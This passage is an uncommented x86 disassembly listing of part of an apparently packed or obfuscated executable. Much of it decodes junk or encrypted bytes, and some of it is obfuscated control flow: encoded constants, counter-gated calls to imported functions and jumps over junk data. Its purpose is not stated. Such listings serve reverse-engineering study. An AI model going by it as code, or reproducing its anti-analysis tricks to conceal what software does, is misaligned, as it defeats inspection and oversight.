  408397:	push   0xddce6025
  40839c:	jmp    0xdfb203a5
  4083a1:	ss push esp
  4083a3:	arpl   WORD PTR [ebx-0x26f11610],di
  4083a9:	xchg   DWORD PTR ds:0xfc08bb05,esi
  4083af:	daa    
  4083b0:	out    dx,eax
  4083b1:	or     al,0xf7
  4083b3:	loop   0x40835c
  4083b5:	enter  0x1133,0x56
  4083b9:	jge    0x4083a2
  4083bb:	sub    ah,BYTE PTR [eax-0x48]
  4083be:	add    DWORD PTR [edx-0x15],0x4b
  4083c2:	in     al,dx
  4083c3:	cmp    BYTE PTR [ebx],cl
  4083c5:	adc    ah,BYTE PTR [edi+ebx*2+0x7f458e99]
  4083cc:	mov    eax,0xa57a96e8
  4083d1:	leave  
  4083d2:	mov    cl,0x4e
  4083d4:	fisub  DWORD PTR [edx-0x26935dca]
  4083da:	inc    eax
  4083db:	lods   al,BYTE PTR ds:[esi]
  4083dc:	pop    ebx
  4083dd:	jo     0x408456
  4083df:	push   0x54fa00dd
  4083e4:	and    ebx,DWORD PTR [ecx-0x2ef023d]
  4083ea:	in     al,0x85
  4083ec:	(bad)  [eax*4-0x76661e2d]
  4083f3:	add    al,0x83
  4083f5:	stos   BYTE PTR es:[edi],al
  4083f6:	xchg   edx,eax
  4083f7:	dec    eax
  4083f8:	adc    ch,BYTE PTR [edx+0x20]
  4083fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4083fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4083fd:	(bad)  
  4083ff:	pop    ss
  408400:	daa    
  408401:	mov    bl,0xf0
  408403:	popf   
  408404:	pusha  
  408405:	and    esp,DWORD PTR [edx+0x39]
  408408:	call   0x80c6:0x4cb8d98e
  40840f:	pop    eax
  408410:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408411:	out    dx,al
  408412:	in     eax,0x15
  408414:	adc    ebp,DWORD PTR [ecx-0x3a]
  408417:	out    0x9d,eax
  408419:	pminsw mm3,QWORD PTR [ecx-0xe]
  40841d:	cdq    
  40841e:	pop    ebp
  40841f:	ret    
  408420:	adc    BYTE PTR [ebp+0x11ca0858],cl
  408426:	sbb    ah,BYTE PTR [eax+ecx*1]
  408429:	dec    esp
  40842a:	out    dx,eax
  40842b:	pop    ecx
  40842c:	and    eax,0x548c3ee9
  408431:	fwait
  408432:	sub    cl,BYTE PTR [esp+edi*4-0x21]
  408436:	cmp    eax,0x13ee1085
  40843b:	(bad)  
  40843d:	fnstenv [edx+0x5bfcdba8]
  408443:	dec    edx
  408444:	mov    ss,WORD PTR ds:0xe7ccb175
  40844a:	aad    0x87
  40844c:	iret   
  40844d:	ds add eax,0x673c8354
  408453:	cmp    edi,DWORD PTR [ebx-0x57]
  408456:	cs out 0x4f,eax
  408459:	push   0x0
  40845b:	rcl    dl,cl
  40845d:	push   ds
  40845e:	fidiv  WORD PTR [edi-0x65325408]
  408464:	cmp    ah,0x8d
  408467:	and    esp,DWORD PTR [edi-0x321b6fcd]
  40846d:	sbb    cl,BYTE PTR cs:[edi-0x41]
  408471:	cmp    DWORD PTR ds:0x8d7cc439,edi
  408477:	inc    ebx
  408478:	pushf  
  408479:	in     al,0xe
  40847b:	out    dx,al
  40847c:	add    dh,dh
  40847e:	push   esi
  40847f:	jb     0x40841d
  408481:	push   ds
  408482:	gs sub DWORD PTR es:[edx-0x8],esi
  408487:	or     DWORD PTR [esi-0x56],eax
  40848a:	int3   
  40848b:	dec    ecx
  40848c:	fsubr  QWORD PTR [ebp+0x6a1315f0]
  408492:	inc    edx
  408493:	ss in  al,dx
  408495:	xchg   esp,eax
  408496:	mov    al,0xb4
  408498:	(bad)  
  408499:	cmp    BYTE PTR [ecx+ebp*1-0x79a2f7e9],ah
  4084a0:	mov    esi,0xa8344c95
  4084a5:	ins    BYTE PTR es:[edi],dx
  4084a6:	adc    esi,ebx
  4084a8:	xchg   BYTE PTR [ebx+0x3e62567],bl
  4084ae:	es data16 clc 
  4084b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4084b2:	and    dl,BYTE PTR [ebp+ebp*8-0x79]
  4084b6:	inc    esp
  4084b7:	xchg   edx,eax
  4084b8:	into   
  4084b9:	jl     0x408501
  4084bb:	jecxz  0x408525
  4084bd:	sbb    edi,DWORD PTR [esi]
  4084bf:	or     esp,ecx
  4084c1:	inc    esp
  4084c2:	test   eax,0x634f8923
  4084c7:	out    dx,al
  4084c8:	rcl    eax,cl
  4084ca:	cwde   
  4084cb:	ins    BYTE PTR es:[edi],dx
  4084cc:	push   ebx
  4084cd:	ss mov eax,0x337dd971
  4084d3:	xor    DWORD PTR [eax],eax
  4084d5:	push   ebx
  4084d6:	xlat   BYTE PTR ds:[bx]
  4084d8:	jbe    0x408552
  4084da:	stos   DWORD PTR es:[edi],eax
  4084db:	ja     0x408543
  4084dd:	mov    dh,BYTE PTR [eax-0x4a514c33]
  4084e3:	rol    DWORD PTR [ecx],cl
  4084e5:	jecxz  0x4084a8
  4084e7:	mov    eax,0x1f133067
  4084ec:	dec    ecx
  4084ed:	aas    
  4084ee:	adc    bh,0x20
  4084f1:	add    DWORD PTR [edi+ecx*1],ecx
  4084f4:	test   BYTE PTR [esi+0x9],cl
  4084f7:	add    BYTE PTR [eax],al
  4084f9:	neg    edx
  4084fb:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  408502:	lea    eax,[ebp-0xc]
  408505:	and    DWORD PTR ds:0x4338af,0x0
  40850f:	jmp    0x408521
  408514:	mov    edx,DWORD PTR ds:0x4338af
  40851a:	inc    edx
  40851b:	mov    DWORD PTR ds:0x4338af,edx
  408521:	cmp    DWORD PTR ds:0x4338af,0x13
  408528:	jae    0x40854b
  40852e:	cmp    DWORD PTR ds:0x4338af,0x17
  408535:	jne    0x408546
  40853b:	push   0x4338e7
  408540:	call   DWORD PTR ds:0x4121cc
  408546:	jmp    0x408514
  40854b:	mov    DWORD PTR [ebp-0x10],eax
  40854e:	and    eax,0x759a
  408553:	mov    eax,DWORD PTR [ebp-0x10]
  408556:	inc    edx
  408557:	mov    edx,DWORD PTR [eax]
  408559:	imul   edx,edx,0xf89ea9ee
  40855f:	mov    DWORD PTR [eax],edx
  408561:	mov    eax,DWORD PTR [ebp-0xc]
  408564:	mov    DWORD PTR ds:0x433797,0x1de7
  40856e:	cmp    eax,0x823721f2
  408573:	je     0x4088e8
  408579:	sub    edi,ebx
  40857b:	mov    eax,DWORD PTR [ebp-0x1c]
  40857e:	sbb    edi,DWORD PTR ds:0x4337f3
  408584:	or     DWORD PTR [eax],0x60751c9e
  40858a:	and    DWORD PTR ds:0x43383f,0x0
  408594:	mov    ebx,DWORD PTR ds:0x43383f
  40859a:	inc    ebx
  40859b:	mov    DWORD PTR ds:0x43383f,ebx
  4085a1:	cmp    DWORD PTR ds:0x43383f,0x1f
  4085a8:	jne    0x4085bf
  4085ae:	push   DWORD PTR [ebp-0x1c]
  4085b1:	push   0x4378
  4085b6:	push   DWORD PTR [ebp-0xc]
  4085b9:	call   DWORD PTR ds:0x412010
  4085bf:	cmp    DWORD PTR ds:0x43383f,0x19
  4085c6:	jb     0x408594
  4085cc:	jmp    0x408753
  4085d1:	xor    BYTE PTR [esi+0x61516153],dh
  4085d7:	xor    BYTE PTR [edi+0x20],dh
  4085da:	outs   dx,BYTE PTR ds:[esi]
  4085db:	fucomi st,st(1)
  4085dd:	mov    bl,ch
  4085df:	add    esi,DWORD PTR [eax-0x14]
  4085e2:	sar    BYTE PTR [esi+0x7e],cl
  4085e5:	in     al,0x7f
  4085e7:	jle    0x408667
  4085e9:	push   esi
  4085ea:	rcr    DWORD PTR [ecx+0x4bd2c847],cl
  4085f0:	fistp  QWORD PTR [esi]
  4085f2:	adc    BYTE PTR [ebx],dh
  4085f4:	sub    cl,ch
  4085f6:	xchg   edi,eax
  4085f7:	inc    edx
  4085f8:	push   cs
  4085f9:	shr    DWORD PTR [ebx],1
  4085fb:	(bad)  
  4085fc:	cdq    
  4085fd:	mov    ah,0xed
  4085ff:	jae    0x408599
  408601:	push   ecx
  408602:	into   
  408603:	push   edx
  408604:	fisttp WORD PTR [esi+0x420292d1]
  40860a:	into   
  40860b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40860c:	adc    DWORD PTR [esi],esi
  40860e:	ds push es
  408610:	jg     0x4085a6
  408612:	xor    esi,DWORD PTR [ecx+edi*1+0x2c9b55e]
  408619:	xchg   ebp,eax
  40861a:	shl    DWORD PTR [eax-0x5ecd263c],1
  408620:	xor    al,0xe1
  408622:	xchg   ebx,eax
  408623:	test   edx,edx
  408625:	inc    edi
  408626:	mov    es,esp
  408628:	lock adc BYTE PTR [edx-0x6679705e],cl
  40862f:	mov    ah,BYTE PTR [edx+0x2aa63de6]
  408635:	repz sub dh,dh
  408638:	or     bl,BYTE PTR [eax+0x37]
  40863b:	popa   
  40863c:	icebp  
  40863d:	push   cs
  40863e:	xchg   edi,eax
  40863f:	ja     0x40864b
  408641:	jp     0x40865a
  408643:	pop    ss
  408644:	lahf   
  408645:	test   al,0xd2
  408647:	popa   
  408648:	adc    BYTE PTR [eax],cl
  40864a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40864b:	push   eax
  40864c:	ss pop edx
  40864e:	test   BYTE PTR [ecx],bh
  408650:	add    dl,dl
  408652:	sub    ch,bl
  408654:	inc    ebx
  408655:	mov    eax,0x3f9323be
  40865a:	pop    es
  40865b:	shl    DWORD PTR [ecx-0x4d],cl
  40865e:	inc    edi
  40865f:	out    0x29,al
  408661:	bound  ebx,QWORD PTR [eax]
  408663:	xor    DWORD PTR ds:0xf234b263,0xffffff91
  40866a:	out    0xdb,eax
  40866c:	or     eax,0x87964e79
  408671:	adc    DWORD PTR [edx-0x38],edi
  408674:	sub    DWORD PTR [eax],ebx
  408676:	cld    
  408677:	pop    ecx
  408678:	pop    esi
  408679:	adc    al,0x70
  40867b:	jmp    0x4dc0afa2
  408680:	adc    dl,cl
  408682:	adc    DWORD PTR [eax+0x7b],ecx
  408685:	pop    edi
  408686:	pop    ebp
  408687:	sar    BYTE PTR [esi],cl
  408689:	fisttp QWORD PTR [ecx-0x1c402f2]
  40868f:	xlat   BYTE PTR ds:[ebx]
  408690:	xchg   BYTE PTR [ebx],ch
  408692:	sub    al,0xb0
  408694:	mov    al,0x7d
  408696:	aam    0xf8
  408698:	xchg   ecx,eax
  408699:	rcr    BYTE PTR [edx+esi*1],cl
  40869c:	loopne 0x4086a5
  40869e:	push   ecx
  40869f:	cmp    al,0x1e
  4086a1:	sbb    dh,BYTE PTR [edx+0x36]
  4086a4:	leave  
  4086a5:	cli    
  4086a6:	lahf   
  4086a7:	sahf   
  4086a8:	test   DWORD PTR ds:0x4201939,ecx
  4086ae:	xchg   edi,eax
  4086af:	ret    0xb5ad
  4086b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086b3:	nop
  4086b4:	aas    
  4086b5:	in     eax,0x11
  4086b7:	stos   BYTE PTR es:[edi],al
  4086b8:	sbb    ch,BYTE PTR [ebp+0x63]
  4086bb:	test   BYTE PTR [ebp+0x50e8e071],dh
  4086c1:	(bad)  
  4086c2:	in     al,0xe6
  4086c4:	addr16 lock ja 0x408740
  4086c8:	inc    edx
  4086c9:	xlat   BYTE PTR ds:[ebx]
  4086ca:	mov    DWORD PTR ds:0x82c2562e,eax
  4086d0:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  4086d2:	cdq    
  4086d3:	xlat   BYTE PTR ds:[ebx]
  4086d4:	aad    0x18
  4086d6:	retf   0x550b
  4086d9:	stos   BYTE PTR es:[edi],al
  4086da:	cmp    al,0x7c
  4086dc:	pusha  
  4086dd:	leave  
  4086de:	dec    esi
  4086df:	imul   eax,DWORD PTR [edx-0x38ed0a2d],0x418d7e19
  4086e9:	mov    ch,0xcc
  4086eb:	js     0x408679
  4086ed:	lds    edi,FWORD PTR [edx+0x1d2c863d]
  4086f3:	or     BYTE PTR [edi+0x66],al
  4086f6:	push   esi
  4086f7:	xor    eax,0x8ab69044
  4086fc:	fld    QWORD PTR [ebp-0x29]
  4086ff:	and    al,0xf6
  408701:	dec    ebx
  408702:	add    al,0xcf
  408704:	sub    edi,DWORD PTR [edi+0x2ad2c161]
  40870a:	mov    ecx,DWORD PTR [edx+0xc]
  40870d:	pop    ebx
  40870e:	adc    ah,dh
  408710:	sbb    BYTE PTR [edi],0xe8
  408713:	jle    0x4086c8
  408715:	pop    es
  408716:	and    BYTE PTR [ecx+eax*1+0xf],ah
  40871a:	add    BYTE PTR [ebx*2-0x465b8a11],ah
  408721:	cmc    
  408722:	pusha  
  408723:	add    eax,0x653351d1
  408728:	cs push edx
  40872a:	lock ret 
  40872c:	(bad)  
  40872d:	les    ebx,FWORD PTR [esi-0x156ca49c]
  408733:	xor    DWORD PTR [edx-0x27],edi
  408736:	push   esp
  408737:	test   esi,0x6a69b8a7
  40873d:	mov    eax,ds:0xd066199b
  408742:	inc    edx
  408743:	test   BYTE PTR [edi],bl
  408745:	out    dx,al
  408746:	ins    DWORD PTR es:[edi],dx
  408747:	test   BYTE PTR [eax+edi*2],0x72
  40874b:	js     0x408792
  40874d:	dec    eax
  40874e:	in     eax,0xc0
  408750:	xchg   ebp,eax
  408751:	xlat   BYTE PTR ds:[ebx]
  408752:	inc    edi
  408753:	mov    eax,DWORD PTR [ebp-0x8]
  408756:	xor    eax,ecx
  408758:	add    eax,esi
  40875a:	jmp    0x4088e1
  40875f:	(bad)  
  408761:	adc    DWORD PTR [ebp+0x71684531],eax
  408767:	test   BYTE PTR [esi+0x41],cl
  40876a:	or     BYTE PTR [edx+eax*1+0x59],bh
  40876e:	cmp    al,0x52
  408770:	sar    DWORD PTR [esi+0x7e],cl
  408773:	in     al,0x7f
  408775:	jle    0x4087f5
  408777:	mov    dl,0x47
  408779:	fmul   st,st(3)
  40877b:	cmp    eax,0x92bbff73
  408780:	addr16 dec esp
  408782:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408783:	inc    esp
  408784:	mov    dh,0xb7
  408786:	scas   eax,DWORD PTR es:[edi]
  408787:	mov    al,0x4f
  408789:	pop    ds
  40878a:	adc    eax,0xfe8b7531
  40878f:	push   eax
  408790:	adc    edx,esp
  408792:	pop    ebx
  408793:	loopne 0x4087cb
  408795:	popf   
  408796:	xor    al,0x1d
  408798:	sbb    al,0x46
  40879a:	dec    ebx
  40879b:	mov    cl,0x6c
  40879d:	and    ebx,DWORD PTR [ebp-0x5b]
  4087a0:	mov    dl,0x2b
  4087a2:	sti    
  4087a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4087a4:	and    BYTE PTR [esi+0x5afebf52],0x13
  4087ab:	sub    DWORD PTR [edx+0x5d3e964e],0xad0e480
  4087b5:	fadd   QWORD PTR [edi]
  4087b7:	adc    DWORD PTR ds:0x6603a15c,esp
  4087bd:	mov    eax,ds:0xcaa3d360
  4087c2:	lahf   
  4087c3:	dec    ebp
  4087c4:	scas   al,BYTE PTR es:[edi]
  4087c5:	lahf   
  4087c6:	inc    eax
  4087c7:	cmp    eax,0x33dc24c9
  4087cc:	jns    0x408829
  4087ce:	ror    BYTE PTR [eax],1
  4087d0:	test   DWORD PTR [edi+esi*4-0x4c],ebx
  4087d4:	push   es
  4087d5:	aaa    
  4087d6:	call   0x686:0xa84db607
  4087dd:	and    al,0x31
  4087df:	test   BYTE PTR [edx-0x76981adf],bh
  4087e5:	adc    DWORD PTR [eax-0x1004078a],esi
  4087eb:	mov    bh,0x69
  4087ed:	and    bl,BYTE PTR [ecx+0x13]
  4087f0:	and    DWORD PTR ds:0x879b9fba,edi
  4087f6:	xor    ebp,DWORD PTR [edi-0x3ec34341]
  4087fc:	xchg   edi,eax
  4087fd:	adc    eax,edi
  4087ff:	cli    
  408800:	pop    edx
  408801:	xor    eax,0xaf189fc8
  408806:	add    DWORD PTR [ebp-0x7403a204],ebp
  40880c:	inc    esi
  40880d:	jge    0x4087bd
  40880f:	adc    eax,DWORD PTR [edi-0x25]
  408812:	sbb    esi,eax
  408814:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408815:	mov    al,0xd3
  408817:	mov    ch,0xd5
  408819:	sbb    eax,DWORD PTR [edx+0x3f]
  40881c:	mov    fs,WORD PTR [edi]
  40881e:	ret    0x32c0
  408821:	mov    ecx,0xb6443b04
  408826:	jae    0x40889d
  408828:	add    bl,BYTE PTR [ebp-0x49]
  40882b:	jmp    0x408843
  40882d:	out    0x3e,eax
  40882f:	rol    BYTE PTR [edx-0x7d],0x2a
  408833:	push   0xffffff9f
  408835:	or     al,BYTE PTR [edi-0x10fea0c3]
  40883b:	(bad)  
  40883d:	jmp    0x4087e8
  40883f:	test   eax,0x89807920
  408844:	aam    0xc4
  408846:	stc    
  408847:	fild   QWORD PTR [ecx+0x15]
  40884a:	adc    eax,0xbbc1ee4b
  40884f:	or     dl,BYTE PTR [edx-0x6adf5e91]
  408855:	fistp  DWORD PTR [edx+0x6b]
  408858:	jno    0x408804
  40885a:	or     BYTE PTR [ebp+ecx*8+0x47283363],bh
  408861:	push   eax
  408862:	xor    al,0xa1
  408864:	loopne 0x408820
  408866:	cmp    esp,DWORD PTR [eax+esi*2]
  408869:	out    dx,eax
  40886a:	mov    ecx,0x943e21b1
  40886f:	icebp  
  408870:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408871:	push   esp
  408872:	mov    DWORD PTR [eax+eiz*2-0x47f42d60],ebx
  408879:	mov    dl,0x7c
  40887b:	popa   
  40887c:	jecxz  0x4088cd
  40887e:	jg     0x4088f4
  408880:	pop    ecx
  408881:	dec    ebp
  408882:	push   ss
  408883:	ror    BYTE PTR gs:[ecx],0x92
  408887:	push   cs
  408888:	mov    esi,0x31bc6f12
  40888d:	jbe    0x408897
  40888f:	addr16 push edi
  408891:	and    DWORD PTR [edi+esi*2+0x44],esp
  408895:	lock sar BYTE PTR [edx-0x4c],0x95
  40889a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40889b:	push   eax
  40889c:	jmp    0xfbf7:0x1f044692
  4088a3:	dec    esi
  4088a4:	adc    esp,DWORD PTR [eax]
  4088a6:	xchg   esi,eax
  4088a7:	mov    ebx,0x9d14d27a
  4088ac:	lock xor dh,BYTE PTR [edi+0x1f]
  4088b0:	and    ch,al
  4088b2:	cwde   
  4088b3:	xor    al,0x96
  4088b5:	cs mov eax,0x7181c9a5
  4088bb:	int    0x29
  4088bd:	xlat   BYTE PTR ds:[ebx]
  4088be:	pop    ebx
  4088bf:	push   ebp
  4088c0:	cmc    
  4088c1:	fimul  DWORD PTR [edi-0x30]
  4088c4:	inc    ebx
  4088c5:	add    ebx,ebx
  4088c7:	ins    BYTE PTR es:[edi],dx
  4088c8:	cli    
  4088c9:	pop    edx
  4088ca:	jle    0x4088d6
  4088cc:	mov    ebp,0xa605963e
  4088d1:	sub    al,BYTE PTR [eax-0x74171792]
  4088d7:	fwait
  4088d8:	mov    ah,0xe8
  4088da:	shr    dl,1
  4088dc:	ret    0x6235
  4088df:	push   eax
  4088e0:	sbb    DWORD PTR [edi+0x5e],0x5b
  4088e4:	leave  
  4088e5:	ret    0x4
  4088e8:	mov    eax,DWORD PTR [ebp-0xc]
  4088eb:	add    eax,DWORD PTR [ebp-0x18]
  4088ee:	cmp    eax,0x7ad64f9b
  4088f3:	je     0x408907
  4088f9:	mov    eax,DWORD PTR [ebp-0x10]
  4088fc:	and    DWORD PTR [eax],0x751c99
  408902:	jmp    0x40858a
  408907:	mov    eax,DWORD PTR [ebp-0xc]
  40890a:	mov    edx,DWORD PTR [ebp-0x18]
  40890d:	or     eax,edx
  40890f:	cmp    eax,0xfabf2dfb
  408914:	je     0x408928
  40891a:	mov    eax,DWORD PTR [ebp-0x10]
  40891d:	xor    DWORD PTR [eax],0x2650fa8f
  408923:	jmp    0x40858a
  408928:	mov    ax,WORD PTR [ebp-0x4]
  40892c:	jmp    0x408ab3
  408931:	test   eax,0x53c2d3f0
  408936:	loope  0x4088e1
  408938:	jno    0x40892b
  40893a:	jmp    0x1e40681a
  40893f:	lods   al,BYTE PTR ds:[esi]
  408940:	jecxz  0x40897a
  408942:	sar    DWORD PTR [esi+0x7e],1
  408945:	in     al,0x7f
  408947:	jle    0x4089c7
  408949:	ret    
  40894a:	sub    esi,DWORD PTR [ecx+0x7b]
  40894d:	scas   al,BYTE PTR es:[edi]
  40894e:	push   ecx
  40894f:	adc    al,0x69
  408951:	jo     0x408955
  408953:	cli    
  408954:	add    eax,0x7e57c135
  408959:	xchg   esp,eax
  40895a:	jle    0x4089a4
  40895c:	sbb    al,0x9d
  40895e:	out    0x5,al
  408960:	dec    eax
  408961:	sti    
  408962:	out    dx,al
  408963:	adc    DWORD PTR [edx-0x7d],0x2d3b296
  40896a:	ins    BYTE PTR es:[edi],dx
  40896b:	mov    bh,0x2
  40896d:	stos   DWORD PTR es:[edi],eax
  40896e:	xchg   edi,eax
  40896f:	dec    edi
  408970:	xchg   edx,eax
  408971:	in     al,0xb0
  408973:	ret    0x3423
  408976:	jmp    0x4089ee
  408978:	add    DWORD PTR [eax],eax
  40897a:	mov    bl,0xfa
  40897c:	fld    DWORD PTR [ebp+0x3ccc936]
  408982:	and    dl,BYTE PTR [esi+ecx*2]
  408985:	or     dl,BYTE PTR [edi]
  408987:	mov    ch,0x93
  408989:	adc    dh,ah
  40898b:	cwde   
  40898c:	aaa    
  40898d:	fnstsw WORD PTR [esi+0x504d2c4e]
  408993:	jp     0x4089da
  408995:	in     al,0x80
  408997:	inc    edx
  408998:	mov    ebx,0xe49beb54
  40899d:	fidiv  WORD PTR [ebx]
  40899f:	dec    esi
  4089a0:	cmc    
  4089a1:	sbb    BYTE PTR [ecx-0xb539fe1],ah
  4089a7:	(bad)
  4089ab:	enter  0x7b92,0xd9
  4089af:	jbe    0x4089d4
  4089b1:	push   es
  4089b2:	neg    bl
  4089b4:	jl     0x408a34
  4089b6:	jecxz  0x408951
  4089b8:	test   BYTE PTR [edi+eiz*2-0x4],ch
  4089bc:	aad    0xa6
  4089be:	inc    esi
  4089bf:	or     bl,BYTE PTR [edi]
  4089c1:	and    BYTE PTR [ebx],ch
  4089c3:	popa   
  4089c4:	dec    ebp
  4089c5:	xor    ah,BYTE PTR [eax+0x764347ac]
  4089cb:	or     ebx,DWORD PTR [edx-0x16]
  4089ce:	or     BYTE PTR [eax],ah
  4089d0:	mov    eax,ds:0x7dc07d51
  4089d5:	ret    
  4089d6:	in     al,0xd7
  4089d8:	lods   al,BYTE PTR ds:[esi]
  4089d9:	mov    WORD PTR [esi+esi*8+0x7a],gs
  4089dd:	pop    esp
  4089de:	outs   dx,BYTE PTR ds:[esi]
  4089df:	fwait
  4089e0:	jo     0x4089dc
  4089e2:	push   ds
  4089e3:	stc    
  4089e4:	sti    
  4089e5:	pop    ebp
  4089e6:	sbb    DWORD PTR [edx-0x5c8814d2],0x5c
  4089ed:	xchg   edx,eax
  4089ee:	adc    esp,ecx
  4089f0:	and    eax,0xa6f0f8b6
  4089f5:	lahf   
  4089f6:	call   DWORD PTR [esi-0x73]
  4089fa:	sub    dl,BYTE PTR [ebp*4+0xa4c2e0b]
  408a01:	out    dx,al
  408a02:	dec    edx
  408a03:	lods   al,BYTE PTR ds:[esi]
  408a04:	mov    ecx,0xfd8da052
  408a09:	xlat   BYTE PTR ds:[ebx]
  408a0a:	mov    eax,0xed3647dc
  408a0f:	xchg   edx,eax
  408a10:	pop    edi
  408a11:	sar    BYTE PTR [edi+0x26],0x9a
  408a15:	inc    edx
  408a16:	mov    esp,0xf0a1789d
  408a1b:	push   esi
  408a1c:	cs test eax,0x91aef450
  408a22:	loop   0x4089ec
  408a24:	fs into 
  408a26:	test   BYTE PTR [ebx-0x451926b9],ah
  408a2c:	sub    BYTE PTR [esi],al
  408a2e:	jb     0x408a61
  408a30:	adc    esi,DWORD PTR [edx-0x648d11cd]
  408a36:	retf   
  408a37:	inc    ebp
  408a38:	sbb    edx,DWORD PTR [ebx+0x37]
  408a3b:	fidiv  DWORD PTR [eax-0x7680c7ab]
  408a41:	stc    
  408a42:	sub    ch,0x24
  408a45:	and    edi,ebx
  408a47:	dec    esp
  408a48:	xchg   BYTE PTR ds:0xb7a88c02,cl
  408a4e:	dec    eax
  408a4f:	cwde   
  408a50:	mov    ecx,0x2d45664d
  408a55:	outs   dx,BYTE PTR ds:[esi]
  408a56:	fsubr  QWORD PTR [ebx]
  408a58:	cmp    edx,edx
  408a5a:	sub    ecx,edx
  408a5c:	xchg   edx,eax
  408a5d:	in     eax,dx
  408a5e:	jmp    0x5fa0:0xfe4692dc
  408a65:	clc    
  408a66:	repnz sub BYTE PTR [esi-0x20],al
  408a6a:	cli    
  408a6b:	shl    DWORD PTR [esi+0x6d048776],0xad
  408a72:	(bad)  
  408a73:	and    eax,0xefa957fd
  408a78:	out    dx,al
  408a79:	dec    esp
  408a7a:	clc    
  408a7b:	fcom   st(4)
  408a7d:	cmp    BYTE PTR [edx],ah
  408a7f:	fmul   QWORD PTR [ebx+0x1a69a745]
  408a85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a86:	ret    0xf350
  408a89:	or     al,cl
  408a8b:	popa   
  408a8c:	mov    ebp,0x61c8de4e
  408a91:	(bad)  
  408a92:	in     eax,0xe4
  408a94:	mov    DWORD PTR [esi],esp
  408a96:	inc    edx
  408a97:	into   
  408a98:	stos   DWORD PTR es:[edi],eax
  408a99:	and    esp,0x7b
  408a9c:	mov    esi,0x660fc188
  408aa1:	jmp    0x408abc
  408aa3:	sub    eax,0x7ff58614
  408aa8:	aam    0xba
  408aaa:	push   DWORD PTR ds:0x9afff344
  408ab0:	shl    BYTE PTR [ebx-0x64],1
  408ab3:	mov    edi,DWORD PTR [ebp+0x8]
  408ab6:	mov    edi,DWORD PTR [edi]
  408ab8:	mov    edx,0x8a3c
  408abd:	xor    ax,dx
  408ac0:	mov    edx,0x3b02
  408ac5:	add    ax,dx
  408ac8:	cmp    ax,WORD PTR [edi]
  408acb:	je     0x408c9f
  408ad1:	mov    eax,DWORD PTR [ebp-0x14]
  408ad4:	xor    eax,ecx
  408ad6:	add    eax,esi
  408ad8:	mov    DWORD PTR [ebp-0x24],eax
  408adb:	mov    eax,DWORD PTR [ebp-0x28]
  408ade:	mov    di,WORD PTR [ebp-0x2c]
  408ae2:	mov    ebx,0x8a3c
  408ae7:	xor    di,bx
  408aea:	add    di,dx
  408aed:	movzx  edx,di
  408af0:	mov    edi,DWORD PTR [ebp-0x8]
  408af3:	xor    edi,ecx
  408af5:	lea    edx,[edx+edi*1+0x32729b]
  408afc:	add    DWORD PTR [eax],edx
  408afe:	mov    eax,DWORD PTR [ebp-0x20]
  408b01:	mov    edx,DWORD PTR [ebp-0x8]
  408b04:	mov    edi,DWORD PTR [ebp-0x24]
  408b07:	xor    edx,ecx
  408b09:	jmp    0x408c90
  408b0e:	push   esi
  408b0f:	adc    BYTE PTR [ebx+0x50555155],0x81
  408b16:	sub    esi,edi
  408b18:	jmp    0x408b0d
  408b1a:	enter  0xfa28,0x3d
  408b1e:	scas   al,BYTE PTR es:[edi]
  408b1f:	fidivr WORD PTR [esi+0x7e]
  408b22:	in     al,0x7f
  408b24:	jle    0x408ba4
  408b26:	mov    esp,0xea9216d3
  408b2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b2c:	and    eax,0x95c1f394
  408b31:	sbb    dh,BYTE PTR [edx]
  408b33:	aaa    
  408b34:	outs   dx,DWORD PTR ds:[esi]
  408b35:	xor    BYTE PTR [esi+0x2],0xd6
  408b39:	sbb    DWORD PTR [esi+edi*1+0x3a777ca1],esp
  408b40:	xlat   BYTE PTR cs:[ebx]
  408b42:	scas   eax,DWORD PTR es:[edi]
  408b43:	shl    BYTE PTR [esi],0x47
  408b46:	pop    ds
  408b47:	xor    al,0xda
  408b49:	and    ebx,edx
  408b4b:	mov    edx,0x6804e79a
  408b50:	ret    0x3951
  408b53:	xchg   esi,eax
  408b54:	xchg   ecx,eax
  408b55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b56:	mov    cl,0x38
  408b58:	sahf   
  408b59:	mov    ds:0x3abde79c,eax
  408b5e:	lea    esi,[esi-0x14dfeb89]
  408b64:	fiadd  DWORD PTR [ebp+0x66]
  408b67:	test   eax,0x214643ca
  408b6c:	push   ebp
  408b6d:	ja     0x408bac
  408b6f:	cmp    al,0x55
  408b71:	call   0x4da3:0x90c63aff
  408b78:	xor    eax,ecx
  408b7a:	into   
  408b7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b7c:	mov    ebx,0x16d8ad5
  408b81:	sar    DWORD PTR [edx+0x2c],cl
  408b84:	(bad)  
  408b85:	adc    bl,BYTE PTR [edx]
  408b87:	push   0xaaf02446
  408b8c:	nop
  408b8d:	fisubr WORD PTR [eax]
  408b8f:	mov    dh,0xdf
  408b91:	mov    dl,0xe7
  408b93:	push   cs
  408b94:	inc    edi
  408b95:	das    
  408b96:	sbb    bl,cl
  408b98:	ret    0x94cb
  408b9b:	xor    DWORD PTR [edi-0x19],edx
  408b9e:	xor    eax,0xac164eae
  408ba3:	lock sbb eax,esi
  408ba6:	clc    
  408ba7:	clc    
  408ba8:	enter  0xa8ae,0xbf
  408bac:	fwait
  408bad:	aam    0x14
  408baf:	cmp    al,0xe1
  408bb1:	add    eax,0x5a03b35f
  408bb6:	push   0xaa2b1a74
  408bbb:	or     eax,0x7cb22338
  408bc0:	mov    ds:0xef0c8b04,al
  408bc5:	mov    bh,0xfc
  408bc7:	sahf   
